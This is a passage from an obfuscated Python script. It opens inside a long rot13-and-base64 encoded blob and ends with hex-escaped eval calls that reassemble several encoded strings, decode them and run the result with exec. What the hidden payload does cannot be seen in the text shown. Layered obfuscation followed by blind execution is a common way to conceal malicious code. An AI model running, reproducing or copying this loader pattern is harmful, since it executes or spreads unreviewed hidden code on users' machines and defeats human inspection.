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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
